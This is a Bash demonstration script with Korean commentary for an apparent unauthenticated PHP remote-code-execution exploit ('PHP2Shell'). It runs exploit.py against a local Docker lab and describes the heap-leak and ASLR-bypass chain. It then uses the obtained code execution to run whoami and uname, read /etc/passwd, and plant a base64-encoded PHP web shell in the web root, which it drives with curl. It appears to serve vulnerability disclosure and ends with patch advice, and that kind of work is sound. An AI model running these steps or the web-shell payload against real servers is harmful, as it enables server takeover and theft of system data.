#!/bin/bash
cd "$(dirname "${BASH_SOURCE[0]}")"

PORT=18120; C=p2s-lab
R=$'\033[0;31m'; G=$'\033[0;32m'; Y=$'\033[1;33m'
CY=$'\033[0;36m'; B=$'\033[1m'; N=$'\033[0m'

hr() { echo "${CY}────────────────────────────────────────${N}"; }

run_attack() {
  local label="$1" cmd="$2"
  echo ""
  echo "  ${Y}▸ ${label}${N}"
  sudo rm -f out/p1 2>/dev/null
  python3 exploit.py --port $PORT --workers 150 --restart $C \
    --cmd "$cmd" 2>&1 | grep -E 'RCE OK|all attempts' | head -1 | sed 's/^/  /'
  sleep 0.5
  return 0
}

clear
hr
echo "${B}PHP2Shell (CVE-2026-109618 / 109619)  RCE 실증 데모${N}"
echo "CVSS 9.2 — PHP 엔진 메모리 버그 → 인증 없이 원격 코드 실행"
hr
sleep 2

echo ""; echo "${B}[1] ASLR 확인${N}"
echo "  kernel.randomize_va_space = ${G}$(cat /proc/sys/kernel/randomize_va_space)${N}  (2=full, 기본값)"
sleep 1.5

echo ""; echo "${B}[2] 타겟 서버 시작${N}"
echo "  ${CY}\$ docker compose up -d${N}"
sudo docker compose up -d 2>&1 | tail -1 | sed 's/^/  /'
sleep 2

echo ""; echo "${B}[3] PHP 설정 (완전 기본값)${N}"
sudo docker exec $C php -i 2>/dev/null | \
  grep -E '^display_errors |^memory_limit |^post_max_size ' | sed 's/^/  /'
echo -n "  MaxRequestWorkers  "
sudo docker exec $C grep -oP 'MaxRequestWorkers\s+\K\d+' \
  /etc/apache2/mods-enabled/mpm_prefork.conf 2>/dev/null || echo "?"
echo "  ${G}✓ php.ini-production 그대로, 환경 조작 없음${N}"
sleep 2

echo ""; echo "${B}[4] 정상 요청${N}"
echo "  ${CY}\$ curl http://127.0.0.1:${PORT}/index.php${N}"
echo "  → ${G}$(curl -s http://127.0.0.1:$PORT/index.php)${N}"
sleep 1.5

hr
echo "${R}${B}[5] 공격 — exploit.py 실행${N}"
echo ""
echo "  ${Y}A1${N} POST 폭탄 (chunked → post_max_size 8M 우회) → OOM"
echo "  ${Y}B1${N} stale 세션 → Set-Cookie에 heap 주소 유출 → ASLR 우회"
echo "  ${Y}A2${N} cheap OOM → dangling pointer"
echo "  ${Y}B2${N} fake HashTable → ${R}system()${N} 실행"
hr
sleep 2

echo ""
echo "  ${CY}\$ python3 exploit.py --port $PORT --workers 150 --restart $C${N}"
echo ""
sleep 1
sudo rm -f out/p1 2>/dev/null
python3 exploit.py --port $PORT --workers 150 --restart $C 2>&1 | \
  while IFS= read -r line; do
    case "$line" in
      *"RCE OK"*)  echo "  ${R}${B}${line}${N}" ;;
      *"libphp="*) echo "  ${G}${line}${N}" ;;
      *)           echo "  ${line}" ;;
    esac
  done
sleep 1

echo ""; echo "${R}${B}[6] 결과 — 서버에서 id 명령 실행됨${N}"
echo "  ${R}$(sudo cat out/p1 2>/dev/null || echo 'fail')${N}"
sleep 2

hr
echo "${R}${B}[7] 추가 공격 시연 — 공격자가 할 수 있는 것${N}"
hr

run_attack "whoami" "whoami>/out/p1"
echo "  → ${R}$(sudo cat out/p1 2>/dev/null)${N}"
sleep 2

run_attack "uname -a (서버 OS 정보 탈취)" "uname -a>/out/p1"
echo "  → ${R}$(sudo cat out/p1 2>/dev/null)${N}"
sleep 2

run_attack "head /etc/passwd (시스템 계정 탈취)" "head -5 /etc/passwd>/out/p1"
echo "  결과:"
sudo cat out/p1 2>/dev/null | while IFS= read -r l; do echo "  ${R}${l}${N}"; done
sleep 2

# 웹셸 — 최대 2회 시도
SHELL_B64="PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+"
for try in 1 2; do
  run_attack "웹셸 설치 (가장 위험, try $try)" "echo ${SHELL_B64}|base64 -d>/var/www/html/shell.php && echo DONE>/out/p1"
  SHELL_OK=$(sudo cat out/p1 2>/dev/null)
  if [ "$SHELL_OK" = "DONE" ]; then
    break
  fi
done

if [ "$SHELL_OK" = "DONE" ]; then
  echo "  ${R}${B}웹셸 생성 완료!${N}"
  sleep 1
  echo ""
  echo "  ${CY}\$ curl 'http://127.0.0.1:${PORT}/shell.php?c=ls -la /'${N}"
  curl -s "http://127.0.0.1:${PORT}/shell.php?c=ls+-la+/" 2>/dev/null | head -8 | \
    while IFS= read -r l; do echo "  ${R}${l}${N}"; done
  echo ""
  echo "  ${R}${B}→ 이제 URL 하나로 서버에서 아무 명령이나 실행 가능${N}"
else
  echo "  ${Y}(웹셸 실패 — exploit은 확률적)${N}"
fi
sleep 3

echo ""
hr
echo "${B}결론${N}"
echo "  • PHP 8.4.26 기본 설정, URL 하나만 알면 ${R}인증 없이 서버 장악${N}"
echo "  • ASLR ON, 128M, 8M — ${R}전부 우회${N}"
echo "  • 대응: ${G}PHP 패치 (8.4.27+ / 7.4.33-31+)${N}"
hr
sleep 2

echo ""
echo "${CY}\$ docker compose down${N}"
sudo docker compose down 2>&1 | tail -1 | sed 's/^/  /'
sudo rm -f www/shell.php 2>/dev/null
echo ""
echo "${G}데모 종료.${N}"
echo ""
